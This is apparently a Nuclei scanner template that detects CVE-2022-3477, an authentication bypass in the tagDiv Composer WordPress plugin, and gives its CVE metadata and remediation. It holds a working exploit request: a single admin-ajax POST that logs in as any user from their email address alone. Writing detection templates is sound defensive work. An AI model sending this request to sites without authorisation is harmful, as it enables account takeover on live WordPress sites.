id: CVE-2022-3477

info:
  name: WordPress tagDiv Composer < 3.5 - Authentication Bypass
  author: melmathari
  severity: critical
  description: |
    The tagDiv Composer WordPress plugin before 3.5, required by the Newspaper WordPress theme before 12.1 and Newsmag WordPress theme before 5.2.2, does not properly implement the Facebook login feature, allowing unauthenticated attackers to login as any user by just knowing their email address
  remediation: Fixed in 3.5
  reference:
    - https://wpscan.com/vulnerability/993a95d2-6fce-48de-ae17-06ce2db829ef
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3477
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-3477
    cwe-id: CWE-287
    epss-score: 0.74272
    epss-percentile: 0.9879
    cpe: cpe:2.3:a:newsmag_project:newsmag:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: newsmag_project
    product: newsmag
    framework: wordpress
  tags: cve,cve2022,wordpress,wp-plugin,wpscan,wp,auth-bypass,tagdiv,vkev

variables:
  email: "{{email}}"  # victim's email address required.

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=td_ajax_fb_login_user&user[email]={{email}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":"You have been successfully logged in!'

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 490a004630440220626d6851a94add42f2c1515de47a5dab3703d2d9cb467e630d3dbc7ed2568c8b02202725addce03bf3f392b921a273af37c656406561bab79f557b74c171cef42fd7:922c64590222798bb761d5b6d8e72950